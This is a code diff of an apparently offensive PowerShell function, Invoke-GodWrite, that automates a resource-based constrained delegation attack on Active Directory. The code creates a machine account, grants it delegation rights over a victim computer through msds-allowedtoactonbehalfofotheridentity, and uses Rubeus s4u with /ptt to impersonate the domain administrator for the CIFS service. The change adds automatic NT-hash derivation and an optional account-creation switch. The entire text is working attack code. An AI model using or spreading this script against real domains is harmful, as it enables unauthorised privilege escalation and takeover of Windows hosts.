@@ -20,26 +20,36 @@ function Invoke-GodWrite
 
         [Parameter(Position = 3)]
         [String]
-        $NewComputerName = "sumikko",
+        $mComputerName = "sumikko",
 
         [Parameter(Position = 4)]
         [String]
-        $NewPwd = "gurashi",
+        $mPwd = "gurashi",
 
         [Parameter(Position = 5)]
         [String]
-        $NewPwdNT = "B443EE718280006B2217770057027E88"
+        $mPwdNT = "",
+
+        [Parameter(Position = 6)]
+        [switch]
+        $Create = $false
     )
 
-    New-MachineAccount -MachineAccount $NewComputerName -Password $(ConvertTo-SecureString $NewPwd -AsPlainText -Force) -Domain $Domain
-    Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $NewComputerName
-    $sid =Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $NewComputerName -Properties objectsid | Select -Expand objectsid
+    if ($Create) {
+        New-MachineAccount -MachineAccount $mComputerName -Password $(ConvertTo-SecureString $mPwd -AsPlainText -Force) -Domain $Domain
+    }
+    if ([string]::IsNullOrEmpty($mPwdNT)) {
+	$output = [Rubeus.Program]::MainString("hash /password:$mPwd")
+	$mPwdNT = ($output | select -Pattern "rc4_hmac.*: (\w+)" -AllMatches).Matches.Groups[1].Value
+    }
+    Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $mComputerName
+    $sid =Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $mComputerName -Properties objectsid | Select -Expand objectsid
     $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
     $SDbytes = New-Object byte[] ($SD.BinaryLength)
     $SD.GetBinaryForm($SDbytes, 0)
     Get-DomainComputer -Domain $Domain -Server $DomainController -Identity $Victim | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Domain $Domain -Server $DomainController
 
-    [Rubeus.Program]::MainString("s4u /user:$NewComputerName$ /rc4:$NewPwdNT /impersonateuser:administrator /msdsspn:CIFS/$Victim.$Domain /ptt /nowrap")
+    [Rubeus.Program]::MainString("s4u /user:$mComputerName$ /rc4:$mPwdNT /impersonateuser:administrator /msdsspn:CIFS/$Victim.$Domain /ptt /nowrap")
     $DCIP = (Resolve-DnsName -Name "$DomainController.$Domain").IPAddress
     $TGIP = (Resolve-DnsName -Name "$Victim.$Domain").IPAddress
 
